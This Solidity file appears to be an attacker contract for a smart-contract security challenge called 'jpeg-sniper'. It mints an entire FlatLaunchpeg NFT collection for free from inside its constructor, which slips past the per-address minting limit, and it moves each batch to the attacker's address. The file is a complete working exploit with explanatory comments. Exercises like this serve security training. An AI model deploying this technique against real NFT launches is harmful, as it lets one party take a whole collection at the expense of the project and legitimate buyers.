// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "src/jpeg-sniper/FlatLaunchpeg.sol";

contract JpegAttack {
    FlatLaunchpeg nft;
    address attacker;

    constructor(address _flatLaunchPeg) {
        attacker = msg.sender;
        nft = FlatLaunchpeg(_flatLaunchPeg);

        // amountToMint = 5
        uint256 amountToMint = nft.maxBatchSize();
        // to keep track of tokenIds to transfer
        uint256 tokenIds;

        // mint only until the maximum collectionSize() which is 69
        while (nft.totalSupply() < nft.collectionSize()) {
            // decrease amountToMint when amountToMint + total supply exceeds 69
            if (amountToMint + nft.totalSupply() >= nft.collectionSize()) {
                amountToMint--;
            }

            // mint amountToMint amount NFTs
            nft.publicSaleMint{value: 0}(amountToMint);

            // transfer minted NFTs to attacker to be able to mint again
            // without triggering error Launchpeg__CanNotMintThisMany
            for (uint256 i = tokenIds; i < amountToMint + tokenIds; i++) {
                nft.transferFrom(address(this), attacker, i);
            }
            // update tokenIds to next time transfer different NFT tokenIds
            // 1. run: tokenIds = 0
            // 2. run: tokenIds = 5
            // 3. run: tokenIds = 10 and so on
            tokenIds = tokenIds + amountToMint;
        }
    }
}
